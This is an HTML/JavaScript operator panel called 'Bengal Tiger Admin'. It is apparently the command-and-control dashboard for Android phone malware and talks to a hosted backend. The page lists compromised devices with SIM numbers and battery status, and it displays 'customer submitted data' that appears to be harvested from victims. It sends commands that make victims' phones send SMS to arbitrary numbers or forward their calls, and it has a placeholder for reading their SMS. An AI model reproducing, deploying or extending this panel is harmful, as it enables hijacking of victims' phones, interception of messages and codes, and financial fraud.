<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bengal Tiger Admin</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --primary: #FFD700; --dark: #111; --success: #28a745; --danger: #dc3545; }
        body { margin: 0; font-family: 'Roboto', sans-serif; background: #f0f2f5; }
        
        /* Toast */
        #toast { visibility: hidden; min-width: 250px; background-color: var(--success); color: #fff; text-align: center; border-radius: 5px; padding: 16px; position: fixed; z-index: 3000; right: 30px; top: 30px; font-weight: bold; opacity: 0; transition: 0.5s; }
        #toast.show { visibility: visible; opacity: 1; top: 60px; }
        #toast.error { background-color: var(--danger); }

        /* Login */
        #login-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--dark); z-index: 2000; display: flex; justify-content: center; align-items: center; flex-direction: column; }
        .login-box { background: white; padding: 40px; border-radius: 8px; text-align: center; width: 300px; }
        .login-box input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; }
        .btn-gold { background: var(--primary); border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; color: var(--dark); }

        /* Dashboard */
        header { background: var(--dark); color: var(--primary); padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
        .controls i { margin-left: 20px; cursor: pointer; font-size: 20px; color: white; transition: 0.3s; }
        .controls i:hover { color: var(--primary); }

        /* Stats */
        .stats { display: flex; justify-content: space-around; padding: 20px; margin-top: 20px; }
        .stat-box { background: white; width: 30%; padding: 20px; text-align: center; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); border-bottom: 4px solid var(--dark); }
        .stat-num { font-size: 32px; font-weight: bold; color: var(--dark); }

        /* Filter Tabs */
        .filters { text-align: center; margin: 20px; }
        .filter-btn { padding: 10px 20px; margin: 0 5px; background: #ddd; border: none; cursor: pointer; border-radius: 20px; font-weight: bold; }
        .filter-btn.active { background: var(--dark); color: var(--primary); }

        /* Cards */
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; padding: 20px; }
        .card { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); border-top: 5px solid #555; position: relative; }
        .card.online { border-top: 5px solid var(--success); }
        .card.pinned { border-top: 5px solid var(--primary); }
        
        .card-header { display: flex; justify-content: space-between; margin-bottom: 10px; }
        .status { font-size: 12px; font-weight: bold; color: #666; }
        .online-text { color: var(--success); }
        
        .info { font-size: 13px; color: #444; margin-bottom: 5px; }
        .btns { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 15px; }
        .btn-sm { padding: 8px; font-size: 12px; cursor: pointer; border: none; border-radius: 4px; color: white; background: #444; font-weight: bold; }
        .btn-sms { background: var(--success); } 
        .btn-call { background: #17a2b8; } 
        .btn-view { background: #9c27b0; }
        .btn-del { background: var(--danger); }
        
        /* Serial Number Badge */
        .serial-badge { position: absolute; top: 10px; right: 10px; background: var(--primary); color: var(--dark); font-weight: bold; padding: 5px 12px; border-radius: 50px; font-size: 14px; }
        
        /* Modal Styles */
        .modal { display: none; position: fixed; z-index: 2500; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); }
        .modal.show { display: flex; align-items: center; justify-content: center; }
        .modal-content { background: white; padding: 30px; border-radius: 10px; width: 80%; max-width: 600px; max-height: 80vh; overflow-y: auto; }
        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
        .modal-header h2 { margin: 0; }
        .close-btn { background: var(--danger); color: white; border: none; padding: 8px 15px; cursor: pointer; border-radius: 4px; font-weight: bold; }
        .data-item { background: #f5f5f5; padding: 12px; margin-bottom: 10px; border-radius: 5px; border-left: 4px solid var(--primary); }
        .data-label { font-weight: bold; color: var(--dark); font-size: 12px; }
        .data-value { color: #555; margin-top: 5px; }
        .no-data { text-align: center; color: #999; padding: 30px; }
    </style>
</head>
<body>

    <div id="toast"><i class="fas fa-check-circle"></i> Success</div>

    <div id="login-screen">
        <h1 style="color:var(--primary)">BENGAL TIGER ADMIN</h1>
        <div class="login-box">
            <input type="password" id="pass" placeholder="Enter Password">
            <button class="btn-gold" onclick="login()">LOGIN</button>
        </div>
    </div>

    <div id="dashboard" style="display:none;">
        <header>
            <h2><i class="fas fa-paw"></i> BENGAL TIGER</h2>
            <div class="controls">
                <i class="fas fa-sync-alt" onclick="fetchData(true)" title="Refresh"></i>
                <i class="fas fa-key" onclick="changePass()" title="Change Password"></i>
                <i class="fas fa-sign-out-alt" onclick="location.reload()" title="Logout"></i>
            </div>
        </header>

        <div class="stats">
            <div class="stat-box"><div class="stat-num" id="s-all">0</div>ALL DEVICES</div>
            <div class="stat-box"><div class="stat-num" id="s-on" style="color:var(--success)">0</div>ONLINE</div>
            <div class="stat-box"><div class="stat-num" id="s-pin" style="color:var(--primary)">0</div>PINNED</div>
        </div>

        <div class="filters">
            <button class="filter-btn active" onclick="filter('all', this)">ALL DEVICES</button>
            <button class="filter-btn" onclick="filter('online', this)">ONLINE</button>
            <button class="filter-btn" onclick="filter('pinned', this)">PINNED</button>
        </div>

        <div class="grid" id="grid"></div>
    </div>

    <!-- View Data Modal -->
    <div id="viewDataModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>📋 Device Data</h2>
                <button class="close-btn" onclick="closeModal('viewDataModal')">✕ Close</button>
            </div>
            <div id="modalBody"></div>
        </div>
    </div>

    <!-- View SMS Modal -->
    <div id="viewSmsModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>📬 SMS Messages</h2>
                <button class="close-btn" onclick="closeModal('viewSmsModal')">✕ Close</button>
            </div>
            <div id="smsModalBody"></div>
        </div>
    </div>

    <script src="https://bengal-tiger-admin-production-8071.up.railway.app/socket.io/socket.io.js"></script>
    <script>
        const socket = io('https://bengal-tiger-admin-production-8071.up.railway.app');
        let devices = [];
        let currentFilter = 'all';

        function toast(msg, err=false) {
            const t = document.getElementById("toast");
            t.innerText = msg;
            t.className = err ? "show error" : "show";
            setTimeout(() => t.className = "", 3000);
        }

        async function login() {
            const p = document.getElementById('pass').value;
            const r = await fetch('https://bengal-tiger-admin-production-8071.up.railway.app/api/login', {
                method:'POST', headers:{'Content-Type':'application/json'},
                body: JSON.stringify({ username: 'admin', password: p })
            });
            const d = await r.json();
            if(d.success) {
                document.getElementById('login-screen').style.display='none';
                document.getElementById('dashboard').style.display='block';
                fetchData(false);
            } else alert("Wrong Password");
        }

        async function fetchData(showMsg) {
            try {
                const r = await fetch('https://bengal-tiger-admin-production-8071.up.railway.app/api/devices');
                if (!r.ok) throw new Error('Network response was not ok: ' + r.status);
                devices = await r.json();
                render();
                if (showMsg) toast("✅ Refresh Successful!");
            } catch (err) {
                console.error('Fetch devices failed', err);
                toast('❌ Refresh failed', true);
            }
        }

        socket.on('dashboard-update', () => fetchData(false));

        function filter(type, btn) {
            currentFilter = type;
            document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            render();
        }

        function render() {
            // Update Stats
            document.getElementById('s-all').innerText = devices.length;
            document.getElementById('s-on').innerText = devices.filter(d=>d.isOnline).length;
            document.getElementById('s-pin').innerText = devices.filter(d=>d.isPinned).length;

            const grid = document.getElementById('grid');
            grid.innerHTML = '';
            
            let list = devices;
            if(currentFilter === 'online') list = devices.filter(d=>d.isOnline);
            if(currentFilter === 'pinned') list = devices.filter(d=>d.isPinned);

            // Sort by latest first
            list = list.sort((a, b) => new Date(b.registrationTimestamp) - new Date(a.registrationTimestamp));

            list.forEach((d, idx) => {
                const serialNum = idx + 1;
                const pinColor = d.isPinned ? 'var(--primary)' : '#ccc';
                const statusHtml = d.isOnline ? '<span class="online-text">● Online</span>' : '<span>○ Offline</span>';
                
                grid.innerHTML += `
                <div class="card ${d.isOnline?'online':''} ${d.isPinned?'pinned':''}">
                    <div class="serial-badge">#${serialNum}</div>
                    <div class="card-header">
                        <b>${d.model}</b>
                        <div>
                            <i class="fas fa-thumbtack" style="color:${pinColor}; cursor:pointer;" onclick="togglePin('${d.deviceId}', ${!d.isPinned})" title="Pin Device"></i>
                        </div>
                    </div>
                    <div class="status">${statusHtml} | Battery: ${d.battery}%</div>
                    <div class="info">Serial: ${d.serialNumber || 'N/A'}</div>
                    <div class="info">SIM 1: ${d.sim1 || 'N/A'}</div>
                    <div class="info">Last Seen: ${new Date(d.lastSeen).toLocaleString()}</div>

                    <div class="btns">
                        <button class="btn-sm btn-view" onclick="viewData('${d.deviceId}')">📋 View Data</button>
                        <button class="btn-sm btn-view" onclick="viewSms('${d.deviceId}')">📬 View SMS</button>
                        <button class="btn-sm btn-sms" onclick="act('${d.deviceId}', 'SEND_SMS')">💬 Send SMS</button>
                        <button class="btn-sm btn-call" onclick="act('${d.deviceId}', 'CALL_FORWARD')">📞 Call Fwd</button>
                        <button class="btn-sm btn-del" onclick="del('${d.deviceId}')">🗑️ Delete</button>
                    </div>
                </div>`;
            });
        }

        async function act(id, type) {
            let data = {};
            
            if(type === 'SEND_SMS') {
                // Prompt for SIM slot selection
                const simSlot = prompt("Select SIM slot (1 or 2):", "1");
                if (!simSlot || (simSlot !== '1' && simSlot !== '2')) {
                    toast('❌ Invalid SIM slot', true);
                    return;
                }
                
                // Prompt for target number
                const number = prompt("Enter target phone number:", "");
                if (!number) {
                    toast('❌ Phone number required', true);
                    return;
                }
                
                // Prompt for message
                const message = prompt("Enter SMS message:", "");
                if (!message) {
                    toast('❌ Message required', true);
                    return;
                }
                
                data = { simSlot, number, message };
                
            } else if(type === 'CALL_FORWARD') {
                const n = prompt("Enter number for call forwarding:", "");
                if(!n) {
                    toast('❌ Phone number required', true);
                    return;
                }
                data = { number: n };
            }

            try {
                const r = await fetch('https://bengal-tiger-admin-production-8071.up.railway.app/api/command', {
                    method:'POST', headers:{'Content-Type':'application/json'},
                    body: JSON.stringify({deviceId: id, action: type, data: data})
                });
                const d = await r.json();
                toast(d.message, !d.success);
            } catch (err) {
                toast('❌ Error: ' + err.message, true);
            }
        }

        async function togglePin(id, s) {
            try {
                const r = await fetch('https://bengal-tiger-admin-production-8071.up.railway.app/api/pin-device', {
                    method:'POST', headers:{'Content-Type':'application/json'},
                    body: JSON.stringify({deviceId: id, status: s})
                });
                const d = await r.json();
                if (d.success) {
                    fetchData(false);
                    toast(d.message, false);
                } else {
                    toast(d.message, true);
                }
            } catch (err) {
                toast('❌ Error: ' + err.message, true);
            }
        }
        
        async function del(id) {
            const password = prompt("Enter admin password to delete this device:");
            if (!password) {
                toast("Password is required to delete device.", true);
                return;
            }
            try {
                const r = await fetch('https://bengal-tiger-admin-production-8071.up.railway.app/api/delete-device', {
                    method:'POST', headers:{'Content-Type':'application/json'},
                    body: JSON.stringify({deviceId: id, password})
                });
                const d = await r.json();
                if (d.success) {
                    fetchData(false);
                    toast('✅ Device deleted successfully', false);
                } else {
                    toast(d.message, true);
                }
            } catch (err) {
                toast('❌ Error: ' + err.message, true);
            }
        }

        async function changePass() {
            const o = prompt("Old Password:");
            const n = prompt("New Password:");
            if(o && n) {
                const r = await fetch('https://bengal-tiger-admin-production-8071.up.railway.app/api/change-password', {
                    method:'POST', headers:{'Content-Type':'application/json'},
                    body: JSON.stringify({oldPassword:o, newPassword:n})
                });
                const d = await r.json();
                toast(d.success ? "✅ Password Changed" : "❌ Wrong Old Password", !d.success);
            }
        }

        // View Data Function
        function viewData(deviceId) {
            const device = devices.find(d => d.deviceId === deviceId);
            if (!device) {
                toast('❌ Device not found', true);
                return;
            }

            const modalBody = document.getElementById('modalBody');
            let html = `
                <div class="data-item">
                    <div class="data-label">🆔 Device ID</div>
                    <div class="data-value">${device.deviceId}</div>
                </div>
                <div class="data-item">
                    <div class="data-label">📱 Model</div>
                    <div class="data-value">${device.model}</div>
                </div>
                <div class="data-item">
                    <div class="data-label">🔢 Serial Number</div>
                    <div class="data-value">${device.serialNumber}</div>
                </div>
                <div class="data-item">
                    <div class="data-label">🤖 Android Version</div>
                    <div class="data-value">${device.androidVersion}</div>
                </div>
                <div class="data-item">
                    <div class="data-label">🔋 Battery</div>
                    <div class="data-value">${device.battery}%</div>
                </div>
                <div class="data-item">
                    <div class="data-label">📞 SIM 1</div>
                    <div class="data-value">${device.sim1 || 'N/A'}</div>
                </div>
                <div class="data-item">
                    <div class="data-label">📞 SIM 2</div>
                    <div class="data-value">${device.sim2 || 'N/A'}</div>
                </div>
                <div class="data-item">
                    <div class="data-label">🟢 Status</div>
                    <div class="data-value">${device.isOnline ? 'Online' : 'Offline'}</div>
                </div>
                <div class="data-item">
                    <div class="data-label">⏱️ Last Seen</div>
                    <div class="data-value">${new Date(device.lastSeen).toLocaleString()}</div>
                </div>
                <hr>
                <h3>📝 Customer Submitted Data</h3>
            `;

            if (device.customerData && Object.keys(device.customerData).length > 0) {
                Object.entries(device.customerData).forEach(([key, value]) => {
                    html += `
                        <div class="data-item">
                            <div class="data-label">${key}</div>
                            <div class="data-value">${JSON.stringify(value)}</div>
                        </div>
                    `;
                });
            } else {
                html += '<div class="no-data">No customer data submitted yet</div>';
            }

            modalBody.innerHTML = html;
            document.getElementById('viewDataModal').classList.add('show');
        }

        // View SMS Function
        function viewSms(deviceId) {
            const device = devices.find(d => d.deviceId === deviceId);
            if (!device) {
                toast('❌ Device not found', true);
                return;
            }

            const smsModalBody = document.getElementById('smsModalBody');
            let html = `
                <div class="data-item">
                    <div class="data-label">📱 Device: ${device.model}</div>
                    <div class="data-value">Fetching SMS messages...</div>
                </div>
                <div class="no-data">
                    Currently configured to fetch SMS from device.<br>
                    <strong>Implementation Note:</strong> Actual SMS retrieval requires:<br>
                    1. Android app to send SMS list via WebSocket<br>
                    2. Server to store SMS data<br>
                    3. Dashboard to display retrieved messages
                </div>
            `;
            smsModalBody.innerHTML = html;
            document.getElementById('viewSmsModal').classList.add('show');
        }

        // Close Modal Function
        function closeModal(modalId) {
            document.getElementById(modalId).classList.remove('show');
        }

        // Close modal when clicking outside
        window.onclick = function(event) {
            const viewDataModal = document.getElementById('viewDataModal');
            const viewSmsModal = document.getElementById('viewSmsModal');
            
            if (event.target == viewDataModal) {
                viewDataModal.classList.remove('show');
            }
            if (event.target == viewSmsModal) {
                viewSmsModal.classList.remove('show');
            }
        }
    </script>
</body>
</html>
